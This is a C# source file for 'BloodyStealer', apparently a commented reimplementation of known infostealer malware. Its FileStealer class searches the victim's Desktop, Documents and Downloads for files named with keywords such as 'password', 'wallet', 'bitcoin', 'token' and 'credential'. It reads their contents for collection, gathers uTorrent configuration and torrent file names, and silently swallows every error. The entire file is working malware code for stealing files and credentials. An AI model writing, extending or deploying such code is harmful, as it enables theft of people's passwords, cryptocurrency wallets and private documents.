using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;

namespace BloodyStealer
{
    /// <summary>
    /// 文件窃取 - 从文件系统收集敏感文件
    /// </summary>
    internal static class FileStealer
    {
        #region 统计计数器

        /// <summary>
        /// 窃取的文件数量
        /// 原始代码: Files.Count
        /// </summary>
        public static int FileCount { get; private set; } = 0;

        /// <summary>
        /// uTorrent数据数量
        /// 原始代码: uTorrent.Count
        /// </summary>
        public static int UTorrentCount { get; private set; } = 0;

        #endregion

        /// <summary>
        /// 收集系统中的敏感文件
        /// </summary>
        /// <returns>收集到的文件列表</returns>
        public static List<FileObject> CollectSensitiveFiles()
        {
            List<FileObject> collectedFiles = new List<FileObject>();

            // 添加uTorrent数据
            try
            {
                FileObject utorrentData = GetUTorrentData();
                if (utorrentData != null)
                {
                    collectedFiles.Add(utorrentData);
                }
            }
            catch { /* 忽略错误 */ }

            // 收集用户目录中的敏感文件
            try
            {
                List<FileObject> userFiles = GetUserDirectorySensitiveFiles();
                collectedFiles.AddRange(userFiles);
            }
            catch { /* 忽略错误 */ }

            // 统计收集到的总文件数
            FileCount = collectedFiles.Count;

            return collectedFiles;
        }

        /// <summary>
        /// 获取uTorrent客户端数据
        /// 原始代码: uTorrent.cs
        /// </summary>
        /// <returns>包含uTorrent数据的文件对象</returns>
        private static FileObject GetUTorrentData()
        {
            StringBuilder result = new StringBuilder();

            try
            {
                // uTorrent配置目录
                string appData = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
                string utorrentPath = Path.Combine(appData, "uTorrent");
                
                if (!Directory.Exists(utorrentPath))
                {
                    return null;
                }

                result.AppendLine("=== uTorrent数据 ===");
                result.AppendLine($"配置路径: {utorrentPath}");
                result.AppendLine();

                // 收集配置文件
                string resumeFile = Path.Combine(utorrentPath, "resume.dat");
                if (File.Exists(resumeFile))
                {
                    result.AppendLine("发现下载恢复文件");
                    UTorrentCount++;
                }

                string settingsFile = Path.Combine(utorrentPath, "settings.dat");
                if (File.Exists(settingsFile))
                {
                    result.AppendLine("发现设置文件");
                    
                    // 统计设置文件大小（间接表示用户活跃程度）
                    FileInfo fileInfo = new FileInfo(settingsFile);
                    result.AppendLine($"设置文件大小: {fileInfo.Length} 字节");
                }

                // 收集种子文件
                string[] torrentFiles = Directory.GetFiles(utorrentPath, "*.torrent");
                result.AppendLine($"发现 {torrentFiles.Length} 个种子文件");
                
                if (torrentFiles.Length > 0)
                {
                    result.AppendLine("\n种子文件列表:");
                    foreach (string torrentFile in torrentFiles.Take(20)) // 最多列出20个
                    {
                        result.AppendLine(Path.GetFileName(torrentFile));
                    }
                    
                    if (torrentFiles.Length > 20)
                    {
                        result.AppendLine($"...还有 {torrentFiles.Length - 20} 个未列出");
                    }
                }
            }
            catch
            {
                // 忽略错误
            }

            return new FileObject("Files/uTorrent.txt", result.ToString());
        }

        /// <summary>
        /// 从用户目录收集敏感文件
        /// 原始代码: Files.cs
        /// </summary>
        /// <returns>收集到的文件列表</returns>
        private static List<FileObject> GetUserDirectorySensitiveFiles()
        {
            List<FileObject> result = new List<FileObject>();
            
            try
            {
                // 查找的文件类型
                string[] fileExtensions = Settings.FileTypes;
                int maxFilesPerType = Settings.MaxCountFiles;
                int maxFileSize = Settings.MaxFileSize;
                
                // 用户相关目录
                string[] searchDirectories = new string[]
                {
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop)),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments)),
                    Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "Downloads")
                };
                
                // 查找关键词（用于文件名和内容过滤）
                string[] sensitiveKeywords = new string[]
                {
                    "password", "passw", "login", "account", "bank", "credit", 
                    "card", "wallet", "crypto", "bitcoin", "btc", "secret", 
                    "private", "key", "token", "auth", "backup", "credential"
                };
                
                StringBuilder fileLog = new StringBuilder();
                fileLog.AppendLine("=== 敏感文件搜索报告 ===");
                
                // 在每个目录中查找每种类型的文件
                foreach (string directory in searchDirectories)
                {
                    if (!Directory.Exists(directory))
                        continue;
                    
                    fileLog.AppendLine($"\n正在搜索目录: {directory}");
                    
                    foreach (string extension in fileExtensions)
                    {
                        try
                        {
                            fileLog.AppendLine($"搜索 {extension} 文件...");
                            
                            // 查找此扩展名的所有文件
                            List<string> files = new List<string>();
                            
                            // 仅搜索顶层目录（不递归）以提高性能
                            foreach (string file in Directory.GetFiles(directory, "*" + extension, SearchOption.TopDirectoryOnly))
                            {
                                // 检查文件大小
                                FileInfo fileInfo = new FileInfo(file);
                                if (fileInfo.Length <= maxFileSize)
                                {
                                    // 检查文件名是否包含敏感关键词
                                    string fileName = Path.GetFileNameWithoutExtension(file).ToLower();
                                    bool isSensitive = sensitiveKeywords.Any(keyword => fileName.Contains(keyword));
                                    
                                    if (isSensitive)
                                    {
                                        files.Add(file);
                                    }
                                }
                                
                                // 如果找到足够多的文件，停止搜索
                                if (files.Count >= maxFilesPerType)
                                    break;
                            }
                            
                            fileLog.AppendLine($"找到 {files.Count} 个敏感 {extension} 文件");
                            
                            // 收集找到的文件
                            foreach (string file in files)
                            {
                                try
                                {
                                    string fileName = Path.GetFileName(file);
                                    string relativePath = directory.Replace(Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), "").TrimStart('\\', '/');
                                    string targetPath = $"Files/{relativePath}/{fileName}";
                                    
                                    // 读取文件内容
                                    byte[] fileContent = File.ReadAllBytes(file);
                                    
                                    // 创建文件对象并添加到结果中
                                    result.Add(new FileObject(targetPath, fileContent));
                                    
                                    fileLog.AppendLine($"已收集: {file}");
                                }
                                catch
                                {
                                    // 忽略单个文件的错误
                                }
                            }
                        }
                        catch
                        {
                            // 忽略单个扩展名的错误
                        }
                    }
                }
                
                // 添加文件搜索报告
                result.Add(new FileObject("Files/SearchReport.txt", fileLog.ToString()));
            }
            catch
            {
                // 忽略总体错误
            }
            
            return result;
        }
    }
} 